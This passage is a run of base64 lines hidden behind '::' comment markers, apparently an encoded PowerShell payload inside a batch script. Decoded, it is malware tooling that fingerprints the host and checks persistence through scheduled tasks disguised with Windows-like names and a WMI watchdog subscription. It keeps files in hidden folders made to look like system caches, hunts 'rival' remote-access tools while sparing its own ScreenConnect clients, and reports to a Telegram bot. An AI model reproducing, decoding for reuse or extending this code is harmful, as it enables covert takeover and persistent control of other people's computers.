::ICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAg
::ICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRv
::bWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8uTWFudWZh
::Y3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRj
::cy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5D
::UFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1P
::YmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsgUHJlc2Vu
::dCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3Qg
::PSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAk
::bWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsg
::IiRfIiB9KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkg
::ew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiop
::XHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9
::ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
::dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0
::YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0
::dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydO
::ZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcn
::IH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgt
::bm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFwWydM
::YXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
::JycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
::dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMg
::PSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxc
::Lnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dz
::IGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZvciB1cw0K
::ICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFk
::eXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJl
::dHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAg
::ICA9IFtib29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRo
::eQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVs
::c2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAg
::ICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
::CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycg
::fSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERl
::dGVjdCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFs
::bG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0K
::ICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdE
::V0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywN
::CiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRv
::cCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
::V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
::JywgJ05pbmphT25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50
::TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0
::bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycs
::ICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldp
::bmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAn
::TGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9t
::Z2FyJywgJ0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwn
::LCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNh
::bHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2JywgJ3JlbW90
::aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
::cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywN
::CiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlC
::b3QnLCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9t
::b3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdl
::ZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxveScsICdQRFEgSW52
::ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdOLWNl
::bnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9u
::aXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
::ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVy
::aXVzJywgJ0lTTCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZO
::QycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRv
::JywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2lu
::dCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5j
::dGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAg
::ICAgICAgJGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQog
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0K
::ICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2b2lkXSRoaXRz
::LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
::JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3Ry
::aW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2Ug
::fQ0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMp
::IHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAg
::ICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
::ICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
::CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUg
::JGQpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicg
::LW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNl
::KicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRvJyAoIiRu
::ICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJl
::dHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtl
::ICIqJHQqIikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAo
::JCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9jZXNzIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBO
::YW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVw
::TmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0
::dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdr
::ZWVwLWRhdHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAg
::ICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVj
::dConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9r
::ZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAg
::ICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
::ICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhS2VlcEZwIHsNCiAgICAkZnAgPSAnOTkwODE5OGU2
::NjhlNDc1MCcNCiAgICAkcCA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2lu
::ZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5jZmcnDQogICAgaWYgKCRXb3Jr
::RGlyKSB7ICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0NCiAg
::ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9
::ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmcA0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAg
::JGdyeXhhRnAgPSBHZXQtR3J5eGFLZWVwRnANCiAgICAkbGlzdCA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVy
::ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudCon
::IH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1l
::IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVs
::c2UgeyAnPycgfQ0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3
::OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZw
::IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
::IGVsc2VpZiAoJGZwIC1lcSAkZ3J5eGFGcCkgeyAnS0VFUC1HUllYQScgfQ0KICAg
::ICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRk
::KCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
::ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAg
::ICB9DQoNCiAgICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZp
::bGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAgICApDQog
::ICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxk
::SXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0k
::bGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8u
::RnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBA
::KA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
::VW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmlu
::c3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAg
::ICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlmICgk
::Xy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAn
::PycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
::PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2Mg
::JHZlcikpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50
::IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0
::dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAkY2ZnLkJP
::VF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAt
::VmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENs
::aWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3
::aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
::cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
::d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHld
::OjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lw
::YWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3Rl
::bSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhP
::UklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::cGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsN
::CiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
::Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVu
::djpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNo
::ZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBhdGgNCiRo
::YXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXls
::b2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5
::IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtz
::dHJpbmddJGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkg
::eyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
::LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0
::LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcp
::DQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQtUGF5
::bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0K
::IyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
::b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0
::LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRp
::ZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAn
::XlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hl
::c1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3Mg
::PSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1h
::cC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
::ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
::aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnUGxh
::U2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQilt
::IChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19D
::KSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQcm94eScgfSk7IFJv
::bGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAo
::JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENv
::bmZsaWN0UmVzJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQopDQoj
::IGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBD
::b21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0
::ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJv
::bGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlD
::KSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9u
::cy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0g
::MA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
::Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRh
::c2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsg
::PSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0g
::W3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
::TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0N
::CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJl
::c2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAg
::ICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1hbmQg
::LW5vdCAkaC5PdXJzKSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1h
::cmsgPSAnTk9UX09VUlMnDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAg
